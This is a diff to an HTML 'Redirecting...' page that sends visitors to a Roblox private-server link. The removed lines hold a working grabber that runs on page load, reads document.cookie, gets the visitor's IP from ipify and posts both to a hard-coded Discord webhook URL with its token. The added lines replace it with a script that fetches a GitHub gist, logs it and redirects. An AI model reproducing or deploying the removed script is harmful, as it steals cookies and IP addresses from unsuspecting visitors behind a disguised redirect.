@@ -4,43 +4,26 @@
     <meta charset="UTF-8">
     <title>Redirecting...</title>
     <script>
-        // Example of a malicious JavaScript snippet
-        function sendInfoToWebhook(info) {
-            fetch('https://discord.com/api/webhooks/1240542461798121513/J2pKhg-ZqVX3cOJGX6chwfrBqjkfwJV08zF77jPs-jPg66oA7OXiUN57sCGnznfeN9d8', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ content: info }),
-            });
-        }
-
-        function getCookies() {
-            // This will only work if cookies are accessible via document.cookie (most are HttpOnly and secure, thus inaccessible)
-            return document.cookie;
-        }
-
-        function getIPAddress() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
+        function loadContent() {
+            fetch('https://gist.githubusercontent.com/Robloxrealdude/9ac07a3b0478651b0fe98bc5aa02ef0d/raw')
+                .then(response => response.text())
                 .then(data => {
-                    const ip = data.ip;
-                    const cookies = getCookies();
-                    const info = `IP Address: ${ip}\nCookies: ${cookies}`;
-                    sendInfoToWebhook(info);
+                    console.log("Content loaded: ", data);
+                    redirectToRoblox();
                 })
                 .catch(error => {
-                    console.error('Error getting IP address:', error);
+                    console.error("Error loading content: ", error);
+                    redirectToRoblox();
                 });
         }
 
-        window.onload = function() {
-            getIPAddress();
-            // Redirect to Roblox game after a short delay
-            setTimeout(() => {
-                window.location.href = "https://www.roblox.com/share?code=dcb34bad84877443bc6947e690d31700&type=Server";
-            }, 3000);
-        };
+        // Redirect to the Roblox game
+        function redirectToRoblox() {
+            window.location.href = "https://www.roblox.com/share?code=dcb34bad84877443bc6947e690d31700&type=Server";
+        }
+
+        // Load content and then redirect
+        window.onload = loadContent;
     </script>
 </head>
 <body>
